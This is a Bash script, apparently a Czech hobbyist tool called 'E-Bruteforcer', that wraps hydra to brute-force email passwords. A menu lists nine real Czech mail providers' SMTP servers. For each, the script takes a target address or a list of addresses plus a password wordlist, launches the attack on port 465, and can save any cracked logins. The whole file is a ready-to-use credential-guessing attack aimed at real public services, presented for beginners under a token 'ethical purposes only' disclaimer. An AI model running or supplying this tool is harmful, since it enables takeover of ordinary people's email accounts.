#!/bin/bash
#   <=: INFO :=>
# Author: James Rock
# Facebook: www.facebook.com/Wicked.W0lf
# ! FOR ETHICAL PURPOSES ONLY !
# For absolute beginners

#BARVY

red="\033[1;31m"
green="\033[1;32m"
blue="\033[1;34m"
white="\033[97m"
nc="\e[0m"

#BANNER
clear
echo -e "\n\n$red	███████╗$nc       $green██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗ "
echo -e "$red 	██╔════╝$nc       $green██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗"
echo -e "$red 	█████╗  $nc$blue█████╗$nc $green██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝"
echo -e "$red 	██╔══╝  $nc$blue╚════╝$nc $green██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗"
echo -e "$red 	███████╗$nc       $green██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║"
echo -e "$red	╚══════╝$nc       $green╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝"
echo -e "\n                                              $white Simple$red Email$blue-"$green"Bruteforcing$white tool"


#VYBER

echo ""
echo -e "		    $blue <=:Vyber SMTP sluzbu z nabidky:=> $nc"
echo ""
echo -e "$green	    ΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞ"
echo -e "	    Ξ	  					     Ξ"
echo -e "	    Ξ	$red 1 : Seznam	4 : Volny     7 : O2        $nc$green Ξ"
echo -e "	    Ξ						     Ξ"
echo -e	"	    Ξ	$red 2 : Atlas	5 : UPC       8 : Tiscali   $nc$green Ξ"
echo -e "	    Ξ						     Ξ"
echo -e "	    Ξ	$red 3 : Centrum	6 : Pipni     9 : T-Mobile $nc$green  Ξ"
echo -e "	    Ξ                                                Ξ"
echo -e "	    ΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞ"
echo -e "\n $green"
read -p " Vybrat : " cislo

#AKCE

if [ $cislo = 1 ]; then
  smtp1=smtp.seznam.cz
  echo ""
  read -p "[SEZNAM] [1] Soubor / [2] Email : " file
    if [ $file = 1 ]; then
       read -p "[SEZNAM] Zadej cestu k Souboru : " soubor
       read -p "[SEZNAM] Zadej cestu k Wordlistu : " wordlist
       read -p "[SEZNAM] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -p "[SEZNAM] Zadej Cestu k souboru : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp1 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp1 smtp
   fi
    elif [ $file = 2 ]; then
	   read -p "[SEZNAM] Zadej Email : " email
	   read -p "[SEZNAM] Zadej cestu k Wordlistu : " wordlist
	   read -p "[SEZNAM] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -p "[SEZNAM] Zadej Cestu k souboru : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp1 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp1 smtp
fi
fi

elif [ $cislo = 2 ]; then
  smtp2=smtp.atlas.cz
  echo ""
  read -p "[ATLAS] [1] Soubor / [2] Email : " file
    if [ $file = 1 ]; then
       read -p "[ATLAS] Zadej cestu k Souboru : " soubor
       read -p "[ATLAS] Zadej cestu k Wordlistu : " wordlist
       read -p "[ATLAS] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -p "[ATLAS] Zadej Cestu k souboru : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp2 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp2 smtp
   fi
    elif [ $file = 2 ]; then
	   read -p "[ATLAS] Zadej Email : " email
	   read -p "[ATLAS] Zadej cestu k Wordlistu : " wordlist
	   read -p "[ATLAS] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -p "[ATLAS] Zadej Cestu k souboru : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp2 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp2 smtp
fi
fi

elif [ $cislo = 3 ]; then
  smtp3=smtp.centrum.cz
  echo ""
  read -p "[CENTRUM] [1] Soubor / [2] Email : " file
    if [ $file = 1 ]; then
       read -p "[CENTRUM] Zadej cestu k Souboru : " soubor
       read -p "[CENTRUM] Zadej cestu k Wordlistu : " wordlist
       read -p "[CENTRUM] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -p "[CENTRUM] Zadej Cestu k souboru : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp3 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp3 smtp
   fi
    elif [ $file = 2 ]; then
	   read -p "[CENTRUM] Zadej Email : " email
	   read -p "[CENTRUM] Zadej cestu k Wordlistu : " wordlist
	   read -p "[CENTRUM] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -p "[CENTRUM] Zadej Cestu k souboru : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp3 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp3 smtp
fi
fi

elif [ $cislo = 4 ]; then
  smtp4=smtp.volny.cz
  echo ""
  read -p "[VOLNY] [1] Soubor / [2] Email : " file
    if [ $file = 1 ]; then
       read -p "[VOLNY] Zadej cestu k Souboru : " soubor
       read -p "[VOLNY] Zadej cestu k Wordlistu : " wordlist
       read -p "[VOLNY] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -p "[VOLNY] Zadej Cestu k souboru : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp4 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp4 smtp
   fi
    elif [ $file = 2 ]; then
	   read -p "[VOLNY] Zadej Email : " email
	   read -p "[VOLNY] Zadej cestu k Wordlistu : " wordlist
	   read -p "[VOLNY] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -p "[VOLNY] Zadej Cestu k souboru : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp4 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp4 smtp
fi
fi

elif [ $cislo = 5 ]; then
  smtp5=smtp.upcmail.cz
  echo ""
read -p "[UPC] [1] Soubor / [2] Email : " file
  if [ $file = 1 ]; then
     read -p "[UPC] Zadej cestu k Souboru : " soubor
     read -p "[UPC] Zadej cestu k Wordlistu : " wordlist
     read -p "[UPC] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -p "[UPC] Zadej Cestu k souboru : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp5 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp5 smtp
 fi
  elif [ $file = 2 ]; then
   read -p "[UPC] Zadej Email : " email
   read -p "[UPC] Zadej cestu k Wordlistu : " wordlist
   read -p "[UPC] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -p "[UPC] Zadej Cestu k souboru : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp5 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp5 smtp
fi
fi

elif [ $cislo = 6 ]; then
  smtp6=smtp.pipni.cz
  echo ""
read -p "[PIPNI] [1] Soubor / [2] Email : " file
  if [ $file = 1 ]; then
     read -p "[PIPNI] Zadej cestu k Souboru : " soubor
     read -p "[PIPNI] Zadej cestu k Wordlistu : " wordlist
     read -p "[PIPNI] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -p "[PIPNI] Zadej Cestu k souboru : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp6 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp6 smtp
 fi
  elif [ $file = 2 ]; then
   read -p "[PIPNI] Zadej Email : " email
   read -p "[PIPNI] Zadej cestu k Wordlistu : " wordlist
   read -p "[PIPNI] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -p "[PIPNI] Zadej Cestu k souboru : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp6 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp6 smtp
fi
fi

elif [ $cislo = 7 ]; then
  smtp7=smtp.etmail.cz
  echo ""
read -p "[O2] [1] Soubor / [2] Email : " file
  if [ $file = 1 ]; then
     read -p "[O2] Zadej cestu k Souboru : " soubor
     read -p "[O2] Zadej cestu k Wordlistu : " wordlist
     read -p "[O2] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -p "[O2] Zadej Cestu k souboru : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp7 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp7 smtp
 fi
  elif [ $file = 2 ]; then
   read -p "[O2] Zadej Email : " email
   read -p "[O2] Zadej cestu k Wordlistu : " wordlist
   read -p "[O2] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -p "[O2] Zadej Cestu k souboru : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp7 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp7 smtp
fi
fi

elif [ $cislo = 8 ]; then
  smtp8=smtp.tiscali.cz
  echo ""
read -p "[TISCALI] [1] Soubor / [2] Email : " file
  if [ $file = 1 ]; then
     read -p "[TISCALI] Zadej cestu k Souboru : " soubor
     read -p "[TISCALI] Zadej cestu k Wordlistu : " wordlist
     read -p "[TISCALI] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -p "[TISCALI] Zadej Cestu k souboru : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp8 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp8 smtp
 fi
  elif [ $file = 2 ]; then
   read -p "[TISCALI] Zadej Email : " email
   read -p "[TISCALI] Zadej cestu k Wordlistu : " wordlist
   read -p "[TISCALI] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -p "[TISCALI] Zadej Cestu k souboru : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp8 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp8 smtp
fi
fi

elif [ $cislo = 9 ]; then
  smtp9=smtp.t-email.cz
  echo ""
read -p "[T-MOBILE] [1] Soubor / [2] Email : " file
  if [ $file = 1 ]; then
     read -p "[T-MOBILE] Zadej cestu k Souboru : " soubor
     read -p "[T-MOBILE] Zadej cestu k Wordlistu : " wordlist
     read -p "[T-MOBILE] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -p "[T-MOBILE] Zadej Cestu k souboru : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp9 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp9 smtp
 fi
  elif [ $file = 2 ]; then
   read -p "[T-MOBILE] Zadej Email : " email
   read -p "[T-MOBILE] Zadej cestu k Wordlistu : " wordlist
   read -p "[T-MOBILE] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -p "[T-MOBILE] Zadej Cestu k souboru : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp9 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp9 smtp
fi
fi
else
 echo -e " \033[7;31m WRONG INPUT! $nc"
exit 1
fi
